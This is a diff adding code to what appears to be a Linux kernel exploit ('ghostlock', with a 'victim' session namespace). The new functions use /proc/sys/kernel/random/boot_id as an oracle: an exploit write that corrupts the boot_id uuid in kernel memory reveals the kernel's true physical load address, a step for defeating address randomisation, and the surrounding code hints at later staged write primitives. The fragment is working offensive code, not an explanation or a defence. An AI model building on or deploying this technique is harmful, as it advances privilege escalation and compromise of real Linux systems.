@@ -681,6 +681,41 @@ namespace ghostlock::session::victim {
         return 1;
     }
 
+#ifdef GHOSTLOCK_PHYS_PROBE
+    /* phys_load oracle: the boot_id uuid string lives in kernel .data at a profile-known
+     * offset from _text. A candidate phys_load that maps the write onto the REAL
+     * boot_id corrupts the uuid, which is world-readable via
+     * /proc/sys/kernel/random/boot_id — an observable, privileged-free hit signal.
+     * The hit candidate equals the true kernel phys load exactly (linear alias math). */
+    namespace {
+        char g_bootid_before[48] = {0};
+    }
+
+    void snapshot_boot_id(void) {
+        ghostlock::support::UniqueFd fd(
+            open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC));
+        if (!fd.valid()) {
+            pr_warning("boot_id snapshot failed errno=%d\n", errno);
+            return;
+        }
+        const ssize_t nr = read(fd.get(), g_bootid_before, sizeof(g_bootid_before) - 1);
+        if (nr <= 0) pr_warning("boot_id snapshot empty\n");
+    }
+
+    int32_t verify_bootid_hit(void *context) {
+        (void) context;
+        char now[48] = {0};
+        ghostlock::support::UniqueFd fd(
+            open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC));
+        if (!fd.valid()) return 0;
+        const ssize_t nr = read(fd.get(), now, sizeof(now) - 1);
+        if (nr <= 0) return 0;
+        if (memcmp(now, g_bootid_before, static_cast<size_t>(nr)) == 0) return 0;
+        pr_success("boot_id ORACLE HIT (uuid corrupted)\n");
+        return 1;
+    }
+#endif
+
     int32_t verify_w2_stage(void *context) {
         auto *stage = static_cast<struct w2_stage_context *>(context);
         if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;
